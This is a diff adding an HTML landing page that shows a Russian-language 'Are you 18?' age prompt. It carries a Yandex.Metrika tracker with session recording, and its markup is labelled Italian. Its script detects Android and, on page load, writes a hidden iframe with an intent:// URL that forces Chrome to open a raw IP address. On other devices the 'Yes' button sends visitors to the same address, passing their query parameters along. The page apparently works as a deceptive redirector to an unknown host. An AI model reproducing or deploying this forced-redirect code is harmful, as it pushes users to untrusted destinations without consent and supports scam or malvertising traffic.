@@ -1,0 +1,64 @@
+
+<!DOCTYPE html>
+
+<html lang="it"><head>
+    <!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(0, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+
+<noscript><div><img src="https://mc.yandex.ru/watch/0" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+       <link rel="stylesheet" href="main.css">
+</head>
+<body>
+    
+    <div class="wrapper">
+        <div class="center">
+            <p>Тебе есть 18?</p>
+            <a class="yes" id="link" >Да</a>
+        </div>
+    </div>
+    
+   <script>
+   var ua = navigator.userAgent.toLowerCase();
+ 
+   var isAndroid = ua.indexOf("android") > -1; //&& ua.indexOf("mobile");
+   if(isAndroid) {
+      let link = "intent://185.179.189.37/hj9jRKsx/?";
+    
+      let utm = window.location.href.split('?').pop();
+  console.log(utm)
+  document.write('<iframe src="'+link + utm + '#Intent;scheme=http;package=com.android.chrome;end"> </iframe>');
+}
+
+      let link = "http://185.179.189.37/hj9jRKsx/?";
+    
+      let utm = window.location.href.split('?').pop();
+
+        document.getElementById('link').onclick = function() { //по клику на кнопку
+        window.location = link + utm; //переправляем пользователя на новый адрес
+}
+
+</script> 
+
+
+    <a href="https://policies.google.com/privacy?hl=bg" class="policy">Privacy policy</a>
+</body>
+
+  
+    
+    </html>
